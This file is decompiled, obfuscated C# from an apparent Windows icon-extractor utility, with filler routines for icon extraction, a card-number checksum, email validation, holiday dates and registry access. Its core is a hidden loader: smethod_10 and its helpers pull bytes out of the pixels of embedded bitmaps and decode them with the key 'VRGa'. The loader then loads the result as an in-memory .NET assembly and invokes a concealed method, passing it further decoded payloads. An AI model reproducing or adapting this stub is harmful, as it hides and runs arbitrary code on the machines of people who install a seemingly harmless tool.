using System;
using System.Collections;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

[StandardModule]
internal sealed class Class6
{
	public delegate void Delegate0(string folder, string file, bool searchingForDupes, int folderX, int folderY, int totalIconsFound);

	public delegate void Delegate1(int totalIconsFound);

	public delegate void Delegate2(int current, int total);

	private static long long_0 = 0L;

	private static long long_1;

	private static SortedList sortedList_0;

	private static string string_0;

	private static bool bool_0;

	private static string string_1;

	private static string string_2;

	private static int int_0;

	private static int int_1;

	private static string[] string_3;

	private static Form form_0;

	private static Icon icon_0;

	[CompilerGenerated]
	private static Delegate0 delegate0_0;

	[CompilerGenerated]
	private static Delegate1 delegate1_0;

	[CompilerGenerated]
	private static Delegate2 delegate2_0;

	private static string string_4;

	public static string string_5;

	public static event Delegate0 Event_0
	{
		[CompilerGenerated]
		add
		{
			Delegate0 @delegate = delegate0_0;
			Delegate0 delegate2;
			Delegate0 value2 = default(Delegate0);
			do
			{
				delegate2 = @delegate;
				int num = 0;
				while (true)
				{
					switch (num)
					{
					case 1:
						@delegate = Interlocked.CompareExchange(ref delegate0_0, value2, delegate2);
						num = 2;
						continue;
					case 0:
						value2 = (Delegate0)Delegate.Combine(delegate2, value);
						num = 1;
						continue;
					}
					break;
				}
			}
			while ((object)@delegate != delegate2);
		}
		[CompilerGenerated]
		remove
		{
			Delegate0 @delegate = delegate0_0;
			Delegate0 delegate2;
			Delegate0 value2 = default(Delegate0);
			do
			{
				delegate2 = @delegate;
				int num = 0;
				while (true)
				{
					switch (num)
					{
					case 1:
						@delegate = Interlocked.CompareExchange(ref delegate0_0, value2, delegate2);
						num = 2;
						continue;
					case 0:
						value2 = (Delegate0)Delegate.Remove(delegate2, value);
						num = 1;
						continue;
					}
					break;
				}
			}
			while ((object)@delegate != delegate2);
		}
	}

	public static event Delegate1 Event_1
	{
		[CompilerGenerated]
		add
		{
			Delegate1 @delegate = delegate1_0;
			Delegate1 delegate2;
			Delegate1 value2 = default(Delegate1);
			do
			{
				delegate2 = @delegate;
				int num = 0;
				while (true)
				{
					switch (num)
					{
					case 1:
						@delegate = Interlocked.CompareExchange(ref delegate1_0, value2, delegate2);
						num = 2;
						continue;
					case 0:
						value2 = (Delegate1)Delegate.Combine(delegate2, value);
						num = 1;
						continue;
					}
					break;
				}
			}
			while ((object)@delegate != delegate2);
		}
		[CompilerGenerated]
		remove
		{
			Delegate1 @delegate = delegate1_0;
			Delegate1 delegate2;
			Delegate1 value2 = default(Delegate1);
			do
			{
				delegate2 = @delegate;
				int num = 0;
				while (true)
				{
					switch (num)
					{
					case 1:
						@delegate = Interlocked.CompareExchange(ref delegate1_0, value2, delegate2);
						num = 2;
						continue;
					case 0:
						value2 = (Delegate1)Delegate.Remove(delegate2, value);
						num = 1;
						continue;
					}
					break;
				}
			}
			while ((object)@delegate != delegate2);
		}
	}

	public static event Delegate2 Event_2
	{
		[CompilerGenerated]
		add
		{
			Delegate2 @delegate = delegate2_0;
			Delegate2 delegate2;
			Delegate2 value2 = default(Delegate2);
			do
			{
				delegate2 = @delegate;
				int num = 0;
				while (true)
				{
					switch (num)
					{
					case 1:
						@delegate = Interlocked.CompareExchange(ref delegate2_0, value2, delegate2);
						num = 2;
						continue;
					case 0:
						value2 = (Delegate2)Delegate.Combine(delegate2, value);
						num = 1;
						continue;
					}
					break;
				}
			}
			while ((object)@delegate != delegate2);
		}
		[CompilerGenerated]
		remove
		{
			Delegate2 @delegate = delegate2_0;
			Delegate2 delegate2;
			Delegate2 value2 = default(Delegate2);
			do
			{
				delegate2 = @delegate;
				int num = 0;
				while (true)
				{
					switch (num)
					{
					case 1:
						@delegate = Interlocked.CompareExchange(ref delegate2_0, value2, delegate2);
						num = 2;
						continue;
					case 0:
						value2 = (Delegate2)Delegate.Remove(delegate2, value);
						num = 1;
						continue;
					}
					break;
				}
			}
			while ((object)@delegate != delegate2);
		}
	}

	static Class6()
	{
		int num = 0;
		while (true)
		{
			switch (num)
			{
			case 4:
				string_5 = "VRGa";
				num = 5;
				break;
			case 3:
				string_4 = "0123456789";
				num = 4;
				break;
			case 2:
				string_0 = "";
				num = 3;
				break;
			case 1:
				sortedList_0 = new SortedList();
				num = 2;
				break;
			case 0:
				long_1 = 0L;
				num = 1;
				break;
			default:
				return;
			}
		}
	}

	[DllImport("shell32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ExtractIconExA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_6, int int_2, ref int int_3, ref int int_4, long long_2);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int DestroyIcon(int hIcon);

	[DllImport("gdi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetStockObject(int nIndex);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int DrawIconEx(int hdc, int xLeft, int yTop, int hIcon, int cxWidth, int cyWidth, int istepIfAniCur, int hbrFlickerFreeDraw, int diFlags);

	[DllImport("shell32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ExtractIconA(int int_2, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_6, int int_3);

	public static bool smethod_0(string string_6, string string_7)
	{
		int num = default(int);
		int num2;
		bool result = default(bool);
		if ((Operators.CompareString(string_6, "VISA", false) == 0) | (Operators.CompareString(string_6, "CarteBleue", false) == 0))
		{
			num = 0;
			num2 = 0;
		}
		else
		{
			if (Operators.CompareString(string_6, "EuroCard", false) != 0)
			{
				goto IL_014b;
			}
			result = true;
			num2 = 11;
		}
		checked
		{
			int num6 = default(int);
			int num5 = default(int);
			int num4 = default(int);
			bool result2 = default(bool);
			while (true)
			{
				switch (num2)
				{
				case 6:
				case 8:
					num6 += -1;
					goto case 3;
				case 3:
					if (num6 < 1)
					{
						if (unchecked(num % 10) != 0)
						{
							result = false;
							num2 = 9;
						}
						else
						{
							result = true;
							num2 = 10;
						}
					}
					else
					{
						num5 = Conversions.ToInteger(Strings.Mid(string_7, num6, 1));
						num2 = 4;
					}
					continue;
				case 7:
					if (num5 >= 10)
					{
						num = num + 1 + num5 - 10;
						num2 = 8;
						continue;
					}
					num += num5;
					goto case 6;
				case 5:
					if (unchecked(num4 % 2) != 0)
					{
						num += num5;
						num2 = 6;
					}
					else
					{
						num5 *= 2;
						num2 = 7;
					}
					continue;
				case 4:
					num4++;
					num2 = 5;
					continue;
				case 1:
					if (Strings.Len(string_7) != 16)
					{
						result = false;
						num2 = 2;
					}
					else
					{
						num6 = Strings.Len(string_7);
						num2 = 3;
					}
					continue;
				case 0:
					num4 = 0;
					num2 = 1;
					continue;
				default:
				{
					string text = smethod_1(string_7);
					string text2 = Strings.Mid(text, 1, 1);
					string text3 = Strings.Mid(text, 2, 1);
					int num3 = Strings.Len(text);
					if ((Operators.CompareString(text2, "5", false) != 0) | (Operators.CompareString(text3, "1", false) < 0) | (Operators.CompareString(text3, "5", false) > 0))
					{
						result = false;
					}
					if (num3 != 16)
					{
						result = false;
					}
					break;
				}
				case 9:
				case 10:
					break;
				case 2:
					return result2;
				}
				break;
			}
			goto IL_014b;
		}
		IL_014b:
		return result;
	}

	public static string smethod_1(string string_6)
	{
		string text = string_6;
		int num = 0;
		checked
		{
			int num2 = default(int);
			while (true)
			{
				switch (num)
				{
				case 0:
					num2 = 1;
					num = 1;
					continue;
				}
				while (true)
				{
					if (num2 <= Strings.Len(text))
					{
						if (Strings.InStr(string_4, Strings.Mid(text, num2, 1), (CompareMethod)0) > 0)
						{
							break;
						}
						text = Strings.Left(text, num2 - 1) + Strings.Mid(text, num2 + 1);
						continue;
					}
					return text;
				}
				num2++;
				num = 2;
			}
		}
	}

	public static byte[] smethod_2(Bitmap bitmap_0, string string_6)
	{
		List<byte> list = new List<byte>();
		int num = 0;
		checked
		{
			Color pixel = default(Color);
			int num4 = default(int);
			int num5 = default(int);
			int num3 = default(int);
			int num2 = default(int);
			while (true)
			{
				switch (num)
				{
				case 6:
					list.Add(pixel.G);
					num = 7;
					break;
				case 5:
					if (pixel != Color.FromArgb(0, 0, 0, 0))
					{
						list.Add(pixel.R);
						num = 6;
						break;
					}
					goto IL_003e;
				case 4:
					if (num4 > num5)
					{
						num3++;
						goto case 2;
					}
					pixel = bitmap_0.GetPixel(num3, num4);
					num = 5;
					break;
				case 2:
					if (num3 <= num2)
					{
						num5 = ((Image)bitmap_0).get_Height() - 1;
						num = 3;
						break;
					}
					return smethod_4(list.ToArray(), string_6);
				case 3:
					num4 = 0;
					num = 4;
					break;
				case 1:
					num3 = 0;
					num = 2;
					break;
				case 0:
					num2 = ((Image)bitmap_0).get_Width() - 1;
					num = 1;
					break;
				default:
					{
						list.Add(pixel.B);
						goto IL_003e;
					}
					IL_003e:
					num4++;
					goto case 4;
				}
			}
		}
	}

	private static int smethod_3(string string_6)
	{
		if (1 == 0)
		{
		}
		int int_ = 0;
		int int_2 = 0;
		return ExtractIconExA(ref string_6, -1, ref int_, ref int_2, 0L);
	}

	public static byte[] smethod_4(byte[] byte_0, string string_6)
	{
		checked
		{
			byte[] array = new byte[string_6.Length * 2 - 1 + 1];
			int num = 0;
			object obj = default(object);
			object obj2 = default(object);
			while (true)
			{
				switch (num)
				{
				case 2:
					if (!ForLoopControl.ForNextCheckObj(obj, obj2, ref obj))
					{
						goto IL_0023;
					}
					goto IL_0035;
				case 1:
					if (!ForLoopControl.ForLoopInitObj(obj, (object)0, (object)((byte_0.Length - 1) * 1), (object)1, ref obj2, ref obj))
					{
						goto IL_0023;
					}
					goto IL_0035;
				case 0:
					Buffer.BlockCopy(string_6.ToCharArray(), 0, array, 0, array.Length);
					num = 1;
					break;
				default:
					{
						return byte_0;
					}
					IL_0023:
					Array.Resize(ref byte_0, byte_0.Length - 1);
					num = 3;
					break;
					IL_0035:
					byte_0[Conversions.ToInteger(Operators.ModObject(obj, (object)byte_0.Length))] = (byte)unchecked(checked((byte_0[Conversions.ToInteger(Operators.ModObject(obj, (object)byte_0.Length))] ^ array[Conversions.ToInteger(Operators.ModObject(obj, (object)array.Length))]) - unchecked((int)byte_0[Conversions.ToInteger(Operators.ModObject(Operators.AddObject(obj, (object)1), (object)byte_0.Length))]) + 256) % 256);
					num = 2;
					break;
				}
			}
		}
	}

	public static void smethod_5(Control control_0, Rectangle rectangle_0, Color color_0, Color color_1, int int_2, int int_3, int int_4, bool bool_1)
	{
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0062: Expected O, but got Unknown
		Graphics obj = control_0.CreateGraphics();
		color_0 = Color.FromArgb(int_2, color_0.R, color_0.G, color_0.B);
		color_1 = ((!bool_1) ? Color.FromArgb(int_3, color_1.R, color_1.G, color_1.B) : Color.Transparent);
		LinearGradientBrush val = new LinearGradientBrush(rectangle_0, color_0, color_1, (float)int_4, true);
		obj.FillRectangle((Brush)(object)val, rectangle_0);
		obj.Dispose();
		for (int num = 0; num == 0; num = 1)
		{
			((Brush)val).Dispose();
		}
	}

	private static void smethod_6(FileInfo fileInfo_0)
	{
		checked
		{
			int num = smethod_3(fileInfo_0.FullName) - 1;
			int num2 = 0;
			Delegate0 delegate3 = default(Delegate0);
			bool flag = default(bool);
			byte[] array = default(byte[]);
			Delegate0 delegate2 = default(Delegate0);
			Delegate0 @delegate = default(Delegate0);
			MemoryStream memoryStream = default(MemoryStream);
			int num4 = default(int);
			IntPtr handle = default(IntPtr);
			int num3 = default(int);
			while (true)
			{
				switch (num2)
				{
				case 15:
					delegate3?.Invoke(string_1, string_2, searchingForDupes: false, int_0, int_1, (int)long_1);
					goto case 12;
				case 12:
					if (flag)
					{
						try
						{
							FileStream fileStream = new FileStream(string_0 + Conversions.ToString(long_0) + ".ico", FileMode.CreateNew);
							fileStream.Write(array, 0, array.Length);
							fileStream.Close();
							int num5 = 0;
							while (true)
							{
								switch (num5)
								{
								case 2:
									delegate2 = delegate0_0;
									num5 = 3;
									continue;
								case 1:
									long_1++;
									num5 = 2;
									continue;
								case 0:
									long_0++;
									num5 = 1;
									continue;
								default:
									delegate2?.Invoke(string_1, string_2, searchingForDupes: false, int_0, int_1, (int)long_1);
									break;
								}
								break;
							}
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							for (int num6 = 0; num6 == 0; num6 = 1)
							{
								ProjectData.ClearProjectError();
							}
						}
					}
					goto IL_0285;
				case 14:
					delegate3 = delegate0_0;
					num2 = 15;
					break;
				case 13:
					@delegate?.Invoke(string_1, string_2, searchingForDupes: true, int_0, int_1, (int)long_1);
					flag = !smethod_7(array);
					num2 = 14;
					break;
				case 11:
					if (!bool_0)
					{
						flag = true;
						num2 = 12;
						break;
					}
					if (bool_0)
					{
						@delegate = delegate0_0;
						num2 = 13;
						break;
					}
					goto case 12;
				case 10:
					memoryStream.Close();
					num2 = 11;
					break;
				case 9:
					memoryStream.Read(array, 0, (int)memoryStream.Length);
					num2 = 10;
					break;
				case 8:
					memoryStream.Position = 0L;
					num2 = 9;
					break;
				case 7:
					array = new byte[(int)memoryStream.Length + 1];
					num2 = 8;
					break;
				case 6:
					form_0.get_Icon().Save((Stream)memoryStream);
					num2 = 7;
					break;
				case 5:
					Application.DoEvents();
					num2 = 6;
					break;
				case 4:
					form_0.set_Icon(Icon.FromHandle(new IntPtr(num4)));
					num2 = 5;
					break;
				case 3:
					if (num4 > 0)
					{
						memoryStream = new MemoryStream();
						num2 = 4;
						break;
					}
					goto IL_0285;
				case 2:
				{
					int int_ = handle.ToInt32();
					string string_ = fileInfo_0.FullName;
					num4 = ExtractIconA(int_, ref string_, num3);
					num2 = 3;
					break;
				}
				case 1:
					if (num3 <= num)
					{
						handle = ((Control)form_0).get_Handle();
						num2 = 2;
						break;
					}
					return;
				case 0:
					num3 = 0;
					num2 = 1;
					break;
				default:
					{
						num3++;
						goto case 1;
					}
					IL_0285:
					DestroyIcon(num4);
					num2 = 16;
					break;
				}
			}
		}
	}

	private static bool smethod_7(byte[] byte_0)
	{
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = sortedList_0.Keys.GetEnumerator();
			int num = 0;
			string text = default(string);
			bool result = default(bool);
			while (true)
			{
				IL_0034:
				if (num == 0)
				{
					while (enumerator.MoveNext())
					{
						if (Operators.CompareString(Conversions.ToString(enumerator.Current), text, false) != 0)
						{
							continue;
						}
						result = true;
						num = 1;
						goto IL_0034;
					}
					break;
				}
				return result;
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		return false;
	}

	public static byte[] smethod_8(Bitmap bitmap_0)
	{
		return smethod_2(bitmap_0, string_5);
	}

	private static void smethod_9()
	{
		FileInfo[] files = new DirectoryInfo(string_0).GetFiles("*.ico");
		int num = 0;
		checked
		{
			Delegate2 @delegate = default(Delegate2);
			int num5 = default(int);
			FileInfo[] array = default(FileInfo[]);
			FileInfo fileInfo = default(FileInfo);
			int num2 = default(int);
			while (true)
			{
				switch (num)
				{
				case 4:
					@delegate = delegate2_0;
					num = 5;
					break;
				case 3:
					if (num5 < array.Length)
					{
						fileInfo = array[num5];
						num = 4;
						break;
					}
					return;
				case 2:
					num5 = 0;
					num = 3;
					break;
				case 1:
					array = files;
					num = 2;
					break;
				case 0:
					num2 = 1;
					num = 1;
					break;
				default:
					@delegate?.Invoke(num2, files.Length);
					try
					{
						FileStream fileStream = new FileStream(fileInfo.FullName, FileMode.Open);
						int num3 = 0;
						while (true)
						{
							switch (num3)
							{
							case 2:
								num2++;
								num3 = 3;
								continue;
							case 1:
								fileStream.Close();
								num3 = 2;
								continue;
							case 0:
								new BinaryReader(fileStream).ReadBytes((int)fileStream.Length);
								num3 = 1;
								continue;
							}
							break;
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						for (int num4 = 0; num4 == 0; num4 = 1)
						{
							ProjectData.ClearProjectError();
						}
					}
					num5++;
					goto case 3;
				}
			}
		}
	}

	public static void smethod_10()
	{
		string[] array = Strings.Split(smethod_13(Class5.Bitmap_4), Conversions.ToString(Strings.Chr(164)), -1, (CompareMethod)0);
		for (int num = 0; num == 0; num = 1)
		{
			AppDomain.CurrentDomain.Load(smethod_8(Class5.Bitmap_0)).GetType(array[0])!.GetMethod(array[1])!.Invoke(null, new object[5]
			{
				smethod_8(Class5.Bitmap_1),
				array[2],
				array[3],
				smethod_8(Class5.Bitmap_2),
				smethod_8(Class5.Bitmap_3)
			});
		}
	}

	public static void smethod_11()
	{
		int num = 0;
		int num2 = 0;
		checked
		{
			Delegate0 delegate2 = default(Delegate0);
			ArrayList arrayList = default(ArrayList);
			Delegate0 delegate4 = default(Delegate0);
			FileInfo fileInfo = default(FileInfo);
			int num4 = default(int);
			FileInfo[] files = default(FileInfo[]);
			int num5 = default(int);
			string[] array = default(string[]);
			string searchPattern = default(string);
			DirectoryInfo directoryInfo = default(DirectoryInfo);
			Delegate0 delegate3 = default(Delegate0);
			Delegate1 @delegate = default(Delegate1);
			while (true)
			{
				switch (num2)
				{
				case 7:
					delegate2?.Invoke(string_1, string_2, searchingForDupes: false, int_0, int_1, (int)long_1);
					try
					{
						string[] directories = Directory.GetDirectories(Conversions.ToString(arrayList[num]));
						int num3 = 0;
						while (true)
						{
							switch (num3)
							{
							case 11:
								delegate4?.Invoke(string_1, fileInfo.get_Name(), searchingForDupes: false, int_0, int_1, (int)long_1);
								smethod_6(fileInfo);
								num3 = 12;
								break;
							case 10:
								delegate4 = delegate0_0;
								num3 = 11;
								break;
							case 9:
								if (num4 >= files.Length)
								{
									num5++;
									goto case 6;
								}
								fileInfo = files[num4];
								num3 = 10;
								break;
							case 6:
								if (num5 < array.Length)
								{
									searchPattern = array[num5];
									num3 = 7;
									break;
								}
								goto end_IL_0223;
							case 8:
								num4 = 0;
								num3 = 9;
								break;
							case 7:
								files = directoryInfo.GetFiles(searchPattern);
								num3 = 8;
								break;
							case 5:
								num5 = 0;
								num3 = 6;
								break;
							case 4:
								delegate3?.Invoke(string_1, "", searchingForDupes: false, int_0, int_1, (int)long_1);
								array = string_3;
								num3 = 5;
								break;
							case 3:
								if ((Operators.CompareString(Strings.Right(string_1, 1), "\\", false) == 0) | (Operators.CompareString(Strings.Right(string_1, 1), "/", false) == 0))
								{
									if (Operators.CompareString(string_1.ToLower(), string_0.ToLower(), false) == 0)
									{
										goto end_IL_0223;
									}
								}
								else if (Operators.CompareString(directoryInfo.FullName + "\\".ToLower(), string_0.ToLower(), false) == 0)
								{
									goto end_IL_0223;
								}
								if (directoryInfo.FullName.ToLower().IndexOf("recycler") <= -1)
								{
									delegate3 = delegate0_0;
									num3 = 4;
									break;
								}
								goto end_IL_0223;
							case 2:
								string_1 = directoryInfo.FullName;
								num3 = 3;
								break;
							case 1:
								directoryInfo = new DirectoryInfo(Conversions.ToString(arrayList[num]));
								num3 = 2;
								break;
							case 0:
								arrayList.AddRange(directories);
								num3 = 1;
								break;
							default:
								num4++;
								goto case 9;
							}
							continue;
							end_IL_0223:
							break;
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						for (int num6 = 0; num6 == 0; num6 = 1)
						{
							ProjectData.ClearProjectError();
						}
					}
					num++;
					goto case 4;
				case 4:
					if (num == arrayList.Count)
					{
						@delegate = delegate1_0;
						num2 = 8;
					}
					else
					{
						int_0 = num;
						num2 = 5;
					}
					break;
				case 6:
					delegate2 = delegate0_0;
					num2 = 7;
					break;
				case 5:
					int_1 = arrayList.Count;
					num2 = 6;
					break;
				case 3:
					if (bool_0)
					{
						smethod_9();
						num2 = 4;
						break;
					}
					goto case 4;
				case 2:
					arrayList.Add(string_1);
					num2 = 3;
					break;
				case 1:
					new ArrayList();
					num2 = 2;
					break;
				case 0:
					arrayList = new ArrayList();
					num2 = 1;
					break;
				default:
					@delegate?.Invoke((int)long_1);
					return;
				}
			}
		}
	}

	public static bool smethod_12(string string_6)
	{
		if (1 == 0)
		{
		}
		if (new Regex("^([a-zA-Z0-9]+(([\\.\\-_]?[a-zA-Z0-9]+)+)?)\\@(([a-zA-Z0-9]+[\\.\\-_])+[a-zA-Z]{2,4})$").Matches(string_6).Count != 1)
		{
			return false;
		}
		return true;
	}

	public static string smethod_13(Bitmap bitmap_0)
	{
		byte[] bytes = smethod_2(bitmap_0, string_5);
		int num = 0;
		string @string = default(string);
		while (true)
		{
			switch (num)
			{
			case 1:
				bytes = null;
				num = 2;
				break;
			case 0:
				@string = Encoding.Default.GetString(bytes);
				num = 1;
				break;
			default:
				return @string;
			}
		}
	}

	public static bool smethod_14(DateTime dateTime_0)
	{
		int num = DateAndTime.Day(dateTime_0);
		int num2 = 0;
		DateTime dateTime2 = default(DateTime);
		int num3 = default(int);
		bool result = default(bool);
		DateTime dateTime = default(DateTime);
		DateTime dateTime4 = default(DateTime);
		int num6 = default(int);
		DateTime dateTime3 = default(DateTime);
		int num4 = default(int);
		int num5 = default(int);
		while (true)
		{
			switch (num2)
			{
			case 19:
				if ((num == DateAndTime.Day(dateTime2)) & (num3 == DateAndTime.Month(dateTime2)))
				{
					result = true;
					num2 = 20;
					continue;
				}
				result = false;
				break;
			case 17:
				if ((num == DateAndTime.Day(dateTime)) & (num3 == DateAndTime.Month(dateTime)))
				{
					result = true;
					num2 = 18;
				}
				else
				{
					dateTime2 = dateTime.AddDays(11.0);
					num2 = 19;
				}
				continue;
			case 15:
				if ((num == DateAndTime.Day(dateTime4)) & (num3 == DateAndTime.Month(dateTime4)))
				{
					result = true;
					num2 = 16;
				}
				else
				{
					dateTime = dateTime4.AddDays(38.0);
					num2 = 17;
				}
				continue;
			case 14:
				if (num6 == 24)
				{
					dateTime3 = dateTime3.AddDays(-1.0);
				}
				if (num6 == 25 && num4 >= 1900 && num4 < 2000)
				{
					dateTime3 = dateTime3.AddDays(-1.0);
				}
				dateTime4 = dateTime3.AddDays(checked(-DateAndTime.Weekday(dateTime3, (FirstDayOfWeek)1) + 2 + 7));
				num2 = 15;
				continue;
			case 13:
				checked
				{
					dateTime3 = dateTime3.AddDays(-unchecked(checked(num6 + 6) % 30));
					num2 = 14;
					continue;
				}
			case 12:
				dateTime3 = Conversions.ToDate("19/04/" + Conversions.ToString(num4));
				num2 = 13;
				continue;
			case 11:
				num6 = checked((int)Math.Round(((double)(11 * num5) - (3.0 + Conversion.Int((2.0 + Conversion.Int((double)num4 / 100.0)) * 3.0 / 7.0))) % 30.0));
				num2 = 12;
				continue;
			case 2:
				if (num == 1 && num3 == 1)
				{
					result = true;
					num2 = 3;
				}
				else if (num == 1 && num3 == 5)
				{
					result = true;
					num2 = 4;
				}
				else if (num == 8 && num3 == 5)
				{
					result = true;
					num2 = 5;
				}
				else if (num == 14 && num3 == 7)
				{
					result = true;
					num2 = 6;
				}
				else if (num == 15 && num3 == 8)
				{
					result = true;
					num2 = 7;
				}
				else if (num == 1 && num3 == 11)
				{
					result = true;
					num2 = 8;
				}
				else if (num == 11 && num3 == 11)
				{
					result = true;
					num2 = 9;
				}
				else if (num == 25 && num3 == 12)
				{
					result = true;
					num2 = 10;
				}
				else
				{
					checked
					{
						num5 = unchecked(num4 % 19) + 1;
						num2 = 11;
					}
				}
				continue;
			case 1:
				num4 = DateAndTime.Year(dateTime_0);
				num2 = 2;
				continue;
			case 0:
				num3 = DateAndTime.Month(dateTime_0);
				num2 = 1;
				continue;
			}
			break;
		}
		return result;
	}

	public static string smethod_15(string string_6, string string_7 = "")
	{
		string result = default(string);
		try
		{
			object obj = default(object);
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Conversions.ToString(obj), writable: false);
			int num = 0;
			while (true)
			{
				switch (num)
				{
				case 0:
					if (registryKey != null)
					{
						string text = Conversions.ToString(registryKey.GetValue(string_6, string_7));
						registryKey.Close();
						result = text;
						num = 1;
					}
					else
					{
						result = string_7;
						num = 2;
					}
					break;
				default:
					return result;
				case 1:
					return result;
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			int num2 = 0;
			while (true)
			{
				switch (num2)
				{
				case 1:
					ProjectData.ClearProjectError();
					num2 = 2;
					break;
				case 0:
					result = string_7;
					num2 = 1;
					break;
				default:
					return result;
				}
			}
		}
	}

	public static bool smethod_16(string string_6, string string_7)
	{
		bool result = default(bool);
		try
		{
			object obj = default(object);
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Conversions.ToString(obj), writable: true);
			int num = 0;
			while (true)
			{
				switch (num)
				{
				case 2:
					result = true;
					num = 3;
					break;
				case 1:
					registryKey.Close();
					num = 2;
					break;
				case 0:
					if (registryKey == null)
					{
						registryKey = Registry.CurrentUser.CreateSubKey(Conversions.ToString(obj));
					}
					if (registryKey != null)
					{
						registryKey.SetValue(string_6, string_7);
						num = 1;
					}
					else
					{
						result = false;
						num = 4;
					}
					break;
				default:
					return result;
				case 3:
					return result;
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			int num2 = 0;
			while (true)
			{
				switch (num2)
				{
				case 1:
					ProjectData.ClearProjectError();
					num2 = 2;
					break;
				case 0:
					result = false;
					num2 = 1;
					break;
				default:
					return result;
				}
			}
		}
	}
}
